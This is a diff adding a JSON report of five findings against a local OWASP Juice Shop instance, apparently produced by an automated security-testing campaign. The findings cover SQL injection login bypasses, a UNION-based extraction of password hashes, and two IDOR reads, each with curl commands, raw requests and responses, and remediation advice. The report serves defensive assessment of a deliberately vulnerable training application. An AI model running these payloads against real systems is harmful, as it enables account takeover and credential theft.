@@ -1,0 +1,196 @@
+[
+  {
+    "campaign_id": "camp_20260924_70602bf9",
+    "node_id": "node_6dbe8e",
+    "title": "SQL Injection Authentication Bypass on /rest/user/login (Admin Account Takeover)",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cve": null,
+    "category": "sql_injection",
+    "mitre_attack_id": "T1190",
+    "mitre_attack_name": "Exploit Public-Facing Application",
+    "iso27001_control": "A.14.2.5 Secure system engineering principles / A.9.4.2 Secure log-on procedures",
+    "status": "exploited",
+    "description": "The login endpoint /rest/user/login builds a raw SQL query from the user-supplied \"email\" field without parameterization. Submitting a classic SQL injection comment-out payload as the email value (admin@juice-sh.op' --) causes the WHERE clause password check to be nullified, allowing authentication as the admin account without knowing its password. The server returned HTTP 200 with a full, validly-signed JWT authentication token for the admin user (role: admin, id: 1, email: admin@juice-sh.op), including the admin's bcrypt/md5 password hash embedded in the JWT payload. This is a complete authentication bypass leading directly to administrative account takeover. A second payload variant confirmed the underlying SQL error by triggering a Sequelize/SQLite exception with full stack trace disclosure (query.js execution path leaked), corroborating that the input is concatenated directly into the SQL statement.",
+    "evidence": {
+      "commands": [
+        "curl -s -i -X POST http://127.0.0.1:3000/rest/user/login -H \"Content-Type: application/json\" -d '{\"email\":\"admin@juice-sh.op'\"'\"' --\",\"password\":\"anything\"}'"
+      ],
+      "payloads": [],
+      "raw_request": "POST /rest/user/login HTTP/1.1\nHost: 127.0.0.1:3000\nContent-Type: application/json\n\n{\"email\":\"admin@juice-sh.op' --\",\"password\":\"anything\"}",
+      "raw_response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n\n{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsIi4uLg==\",\"bid\":1,\"umail\":\"EMAIL_001\"}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Request 1: email=\"admin@juice-sh.op' --\", password=\"anything\" -> HTTP 200, admin JWT issued (role:admin, id:1, email:admin@juice-sh.op, password hash disclosed in token payload)",
+        "Request 2: email=\"admin@juice-sh.op')-- \", password=\"x\" -> HTTP 500, Sequelize/SQLite stack trace disclosed confirming raw SQL concatenation"
+      ],
+      "explanation": "The application concatenates the raw email input into a SQL WHERE clause used for password verification (typical Juice Shop pattern: SELECT * FROM Users WHERE email = '<input>' AND password = '<hash>'). By injecting admin@juice-sh.op' -- the trailing password comparison is commented out, so the query effectively becomes \"WHERE email = 'admin@juice-sh.op'\" with no password check, causing the backend to authenticate as admin. The response includes a complete, correctly-signed RS256 JWT identical to a legitimate admin session token, which can be used immediately to call any admin-only REST endpoint. The follow-up malformed payload variant produced an unhandled SQLite query exception with a full Node.js/Sequelize stack trace, independently proving the injection point and that error handling leaks internal file paths."
+    },
+    "remediation": "Use parameterized queries / Sequelize ORM query builder methods (findOne with proper where clause objects) instead of raw string concatenation for authentication queries. Implement generic error responses for authentication failures without exposing stack traces (disable verbose error output in production, set NODE_ENV=production).",
+    "plugin_or_component": "rest/user/login (Sequelize/SQLite backend)",
+    "endpoint": "POST /rest/user/login",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-09-24T10:26:12Z",
+    "id": "vuln_59058f",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260924_70602bf9",
+    "node_id": "node_3eb9b4",
+    "title": "SQL Injection (UNION-based) in Product Search — Cross-Table Credential Extraction",
+    "severity": "high",
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cve": null,
+    "category": "sql_injection",
+    "mitre_attack_id": "T1190",
+    "mitre_attack_name": "Exploit Public-Facing Application",
+    "iso27001_control": "A.8.28 Secure Coding / A.8.26 Application Security Requirements",
+    "status": "exploited",
+    "description": "The product search endpoint concatenates the user-supplied `q` parameter directly into a raw SQL query without parameterization. An unauthenticated attacker can inject a UNION SELECT clause to pivot out of the Products table and read arbitrary columns from the Users table, including password hashes, in a single unauthenticated request.",
+    "evidence": {
+      "commands": [
+        "curl -s -i \"http://127.0.0.1:3000/rest/products/search?q=apple%27))+UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+Users--\""
+      ],
+      "payloads": [],
+      "raw_request": "GET /rest/products/search?q=apple%27))+UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+Users-- HTTP/1.1\nHost: 127.0.0.1:3000",
+      "raw_response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n{\"status\":\"success\",\"data\":[{\"id\":1,\"name\":\"EMAIL_001\",\"description\":\"0192023a7bbd73250516f069df18b500\",\"price\":4,...}, ... 24 rows ...]}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Request sent with q=apple')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--",
+        "Response: HTTP 200, JSON array where product \"name\" field = anonymized email placeholder (EMAIL_001..EMAIL_024, \"demo\" for id 17) and \"description\" field = MD5 password hash.",
+        "Cross-checked: id=1 description hash \"0192023a7bbd73250516f069df18b500\" matches the exact password hash field returned in the admin account's own JWT payload obtained via the login SQLi bypass finding (id:1, email:admin@juice-sh.op, password:\"0192023a7bbd73250516f069df18b500\") — confirming the extracted data is the REAL Users table content, not a coincidence."
+      ],
+      "explanation": "This proves genuine UNION-based SQL injection: the injected query successfully joined the Users table into the Products search result set and exfiltrated the real password hash of the admin account (verified byte-for-byte against the hash independently decoded from the admin JWT obtained in the companion login-bypass finding). Because the injection point accepts an arbitrary UNION SELECT with attacker-controlled column list, any table/column in the database (not just Users) can be exfiltrated by an unauthenticated user. The hashes are unsalted MD5, meaning any extracted hash is trivially crackable, escalating this into full credential compromise for every registered user."
+    },
+    "remediation": "Replace raw/string-concatenated SQL with parameterized queries or the ORM's safe query builder (Sequelize `sequelize.query` with `replacements`/bind parameters, or standard `findAll`/`where` methods). Apply strict input validation/allow-listing on the search parameter and enforce least-privilege DB credentials for the application account so it cannot read columns outside the intended schema.",
+    "plugin_or_component": "Product Search (Sequelize raw query, SQLite backend)",
+    "endpoint": "GET /rest/products/search?q=",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-09-24T10:29:49Z",
+    "id": "vuln_59b74d",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260924_70602bf9",
+    "node_id": "node_8c78c1",
+    "title": "SQL Injection Authentication Bypass — Full Admin Account Takeover via Login Endpoint",
+    "severity": "critical",
+    "cvss_score": 9.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "cve": null,
+    "category": "sql_injection",
+    "mitre_attack_id": "T1190",
+    "mitre_attack_name": "Exploit Public-Facing Application",
+    "iso27001_control": "A.8.28 Secure Coding / A.5.17 Authentication Information / A.8.26 Application Security Requirements",
+    "status": "exploited",
+    "description": "The login endpoint builds its SQL WHERE clause by concatenating the raw `email` field. Submitting a classic tautology payload (`email` containing `' OR 1=1--`) collapses the WHERE clause, causing the query to always match and returning the credentials of the first row in the Users table (the admin account), completely bypassing password verification.",
+    "evidence": {
+      "commands": [
+        "curl -s -i -X POST http://127.0.0.1:3000/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"admin@juice-sh.op' OR 1=1--\\\",\\\"password\\\":\\\"x\\\"}\""
+      ],
+      "payloads": [],
+      "raw_request": "POST /rest/user/login HTTP/1.1\nHost: 127.0.0.1:3000\nContent-Type: application/json\n\n{\"email\":\"admin@juice-sh.op' OR 1=1--\",\"password\":\"x\"}",
+      "raw_response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInJvbGUiOiJhZG1pbiIsIi4uLg.SIGNATURE\",\"bid\":1,\"umail\":\"EMAIL_001\"}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Request: POST /rest/user/login body {\"email\":\"admin@juice-sh.op' OR 1=1--\",\"password\":\"x\"}",
+        "Response: HTTP 200, JSON body contains authentication.token = valid RS256-signed JWT.",
+        "Decoded JWT payload: {\"id\":1,\"email\":\"admin@juice-sh.op\",\"password\":\"0192023a7bbd73250516f069df18b500\",\"role\":\"admin\", ...}",
+        "No valid password was ever supplied; the attacker used the literal string \"x\" as password and still received a fully authenticated admin session token usable for subsequent API calls (verified working in the IDOR findings below)."
+      ],
+      "explanation": "This is complete end-to-end authentication bypass, not a mere signal: the server returned a cryptographically valid session token asserting role=admin, and that token was subsequently used successfully to authenticate against other protected endpoints (see IDOR findings), proving the bypass grants real, usable administrative session state — not just an information leak. Any attacker with network access to this endpoint can become an authenticated administrator with zero valid credentials."
+    },
+    "remediation": "Use parameterized queries / ORM-safe lookups for authentication (never build the login WHERE clause via string concatenation). Additionally implement server-side password comparison using constant-time hash verification (bcrypt/argon2) instead of relying on SQL to match plaintext-derived hash equality. Add anomaly detection/logging for auth attempts containing SQL metacharacters.",
+    "plugin_or_component": "User Login (Sequelize raw query, SQLite backend)",
+    "endpoint": "POST /rest/user/login",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-09-24T10:30:04Z",
+    "id": "vuln_9a7dde",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260924_70602bf9",
+    "node_id": "node_ae5f4e",
+    "title": "IDOR / Broken Access Control — Cross-User Basket Disclosure via GET /rest/basket/:id",
+    "severity": "medium",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+    "cve": null,
+    "category": "idor",
+    "mitre_attack_id": "T1213",
+    "mitre_attack_name": "Data from Information Repositories",
+    "iso27001_control": "A.8.3 Information Access Restriction / A.8.2 Privileged Access Rights",
+    "status": "exploited",
+    "description": "The `GET /rest/basket/:id` endpoint validates that a Bearer token is present and well-formed, but never checks that the numeric basket `:id` in the URL actually belongs to the authenticated user (JWT `bid` claim vs the requested path id). Any authenticated user can enumerate basket IDs and read the full basket contents of other users, including admin.",
+    "evidence": {
+      "commands": [
+        "curl -s -i http://127.0.0.1:3000/rest/basket/1 -H \"Authorization: Bearer <JIM_customer_JWT_bid=2>\""
+      ],
+      "payloads": [],
+      "raw_request": "GET /rest/basket/1 HTTP/1.1\nHost: 127.0.0.1:3000\nAuthorization: Bearer eyJ...(jim, id:2, role:customer, bid:2)",
+      "raw_response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n{\"status\":\"success\",\"data\":{\"id\":1,\"coupon\":null,\"UserId\":1,\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\", ...},{\"id\":2,\"name\":\"Orange Juice (1000ml)\", ...},{\"id\":3,\"name\":\"Eggfruit Juice (500ml)\", ...}]}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "1) Obtained a low-privilege customer session via a targeted SQLi-comment login (email=\"jim@juice-sh.op'--\") -> JWT with id:2, role:customer, bid:2.",
+        "2) Confirmed jim's own basket at GET /rest/basket/2 returns UserId:2, own products (Raspberry Juice).",
+        "3) Called GET /rest/basket/1 with the SAME jim (customer, non-owner) token -> HTTP 200, returned UserId:1 (admin) basket with 3 unrelated products (Apple/Orange/Eggfruit Juice) belonging to the admin account.",
+        "4) No ownership check was enforced; only presence of a valid JWT was required."
+      ],
+      "explanation": "This is demonstrated, not theoretical: a session belonging to user id=2 (role customer) successfully retrieved the full basket object (UserId, product list, quantities, timestamps) of user id=1 (role admin) by simply changing the numeric path parameter. This is textbook IDOR / broken access control (OWASP A01) — the JWT correctly authenticates identity but the backend fails to authorize the specific resource against that identity. Note: the equivalent WRITE path (POST /api/BasketItems) DOES correctly validate ownership and returned 401 \"Invalid BasketId\" when jim attempted to add an item to basket 1 — so only the READ path is affected; integrity of baskets is not impacted by this specific finding."
+    },
+    "remediation": "Enforce object-level authorization on every basket lookup: derive the basket id from the authenticated JWT's `bid`/user id server-side rather than trusting the client-supplied path parameter, or explicitly verify `basket.UserId === req.user.id` before returning data (mirroring the check already correctly implemented on the BasketItems write path).",
+    "plugin_or_component": "Basket REST resource",
+    "endpoint": "GET /rest/basket/1 (accessed while authenticated as a different, low-privileged customer)",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-09-24T10:30:18Z",
+    "id": "vuln_004a45",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260924_70602bf9",
+    "node_id": "node_f1297a",
+    "title": "IDOR / Broken Access Control — Cross-User Profile Disclosure via GET /api/Users/:id",
+    "severity": "medium",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+    "cve": null,
+    "category": "idor",
+    "mitre_attack_id": "T1213",
+    "mitre_attack_name": "Data from Information Repositories",
+    "iso27001_control": "A.8.3 Information Access Restriction / A.8.2 Privileged Access Rights",
+    "status": "exploited",
+    "description": "The `GET /api/Users/:id` endpoint returns any user's profile record to any authenticated caller regardless of role or ownership, disclosing role, profile image path, account timestamps and internal identifiers for arbitrary accounts, including the admin account.",
+    "evidence": {
+      "commands": [
+        "curl -s -i http://127.0.0.1:3000/api/Users/1 -H \"Authorization: Bearer <JIM_customer_JWT_id=2>\""
+      ],
+      "payloads": [],
+      "raw_request": "GET /api/Users/1 HTTP/1.1\nHost: 127.0.0.1:3000\nAuthorization: Bearer eyJ...(jim, id:2, role:customer)",
+      "raw_response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n{\"status\":\"success\",\"data\":{\"id\":1,\"username\":\"\",\"email\":\"EMAIL_001\",\"role\":\"admin\",\"deluxeToken\":\"\",\"profileImage\":\"assets/public/images/uploads/defaultAdmin.png\",\"isActive\":true, ...}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Called GET /api/Users/1 while authenticated as customer id=2 (jim) -> HTTP 200 with full JSON profile of user id=1: {\"id\":1,\"email\":\"EMAIL_001\",\"role\":\"admin\",\"profileImage\":\"assets/public/images/uploads/defaultAdmin.png\",\"isActive\":true, ...}. No 403/401 returned despite the caller not owning that record and not holding admin role."
+      ],
+      "explanation": "Demonstrated cross-account data disclosure: a non-privileged customer session enumerated and successfully retrieved another account's full profile object, including its privileged role designation — directly useful for attacker reconnaissance ahead of further privilege-escalation attempts (e.g., pinpointing which numeric id corresponds to the admin account, as leveraged in the basket IDOR finding above)."
+    },
+    "remediation": "Restrict `GET /api/Users/:id` to the record owner or an administrator role, enforced server-side via middleware that compares `req.user.id`/role against the requested resource id before the ORM lookup executes.",
+    "plugin_or_component": "Users REST resource",
+    "endpoint": "GET /api/Users/1 (accessed while authenticated as a different, low-privileged customer)",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-09-24T10:30:29Z",
+    "id": "vuln_b5e0d7",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  }
+]
